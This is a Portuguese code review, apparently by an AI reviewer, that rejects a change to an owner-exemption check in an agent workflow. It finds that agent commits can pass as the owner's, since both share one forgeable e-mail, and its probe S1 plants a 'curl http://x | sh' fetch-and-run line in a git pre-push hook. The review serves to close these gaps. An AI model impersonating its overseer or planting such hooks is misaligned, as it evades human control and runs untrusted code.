---
tipo: review
contrato: 1
pedido: v0478
branch: melhoria/v0479-pp1-aplicado-dono
commit: 4aadad19d27ec28ce467a05a61bd070e3497b003
parecer: reprovado
revisor: forge:tech-lead
data: 2026-11-20
---
# Review: v0478 E52.2 (PP1-APLICADO-PELO-DONO)

Escopo: `bin/forge-check` (`isencao_do_dono`, `em_vigor`, `emails_do_dono`, `patch_declarado`, `patch_revisado_do_dono`, gravação em `cmd_entrega_conferir`) e a classe `PatchRevisadoDoDono` em `tests/test_conf_escopo.py`, contra as quatro condições da DECISÃO DO DONO de 18/11 15:10 no pedido.

## Achados
- A1 (bloqueante) bin/forge-check:2264 · A decisão manda o patch revisado aplicado sobre a develop atual; o código aplica sobre o pai do commit do dono. Mudança anterior de agente no arquivo em vigor, na mesma branch, passa como do dono (sonda S1, rc 0). Compare o blob do head com o da base (Base-sha) mais o patch.
- A2 (bloqueante) bin/forge-check:2256 · Condição "o commit tem que ser meu": o e-mail de autor e committer não separa dono de agente; os commits do agente (16ddcc44) e do dono (0eedfdea) têm o mesmo e-mail, e `git -c user.email` o forja. Precisa prova que o agente não tem (assinatura) ou nova decisão do dono.

## Sondas
- S1 · commit de agente põe `curl http://x | sh` no .githooks/pre-push; patch revisado só soma `exit 0` no fim; o dono aplica · espera: recusa (develop + patch difere do head) · obtido: rc 0, `escopo: ok (patch do dono` e a linha gravada
- S2 · `git log -1 --format='%ae %ce'` em 16ddcc44 (autor agente) e em 0eedfdea (dono) · espera: e-mails distintos · obtido: o mesmo e-mail nos dois, autor e committer

## Parecer
Reprovado. O resto está correto e simples: índice temporário por `GIT_INDEX_FILE` sem tocar o do repositório (teste próprio), `em_vigor` falha fechado sem a política, `.forge/config.json` da raiz é arquivo em vigor na `conformidade.json`, a conferência grava sha256 do patch e sha40 do commit (c) e há o caso do patch adulterado com uma linha a mais (d). Classe nova rodada: 6 testes, OK. Suíte inteira fica no CI (R-REVIEW).

A1: o pai é a branch, não a develop; a escolha só equivale à decisão se nenhum commit anterior da branch tocou o arquivo. Sugestão: exigir que o blob do arquivo no pai seja o do Base-sha (ou aplicar o patch sobre a árvore do Base-sha e comparar só aquele caminho), com teste da S1.

A2: a escolha do autor (e-mail em `emails_do_dono`) não verifica o requisito nesta máquina, onde o agente commita com a identidade do dono. Conserto possível: `git verify-commit` com chave do dono fora do alcance dos agentes; como muda o mecanismo, a escolha volta ao dono pelo Jarvis (R-DECISAO), sem contorno (R-CONFORMIDADE).
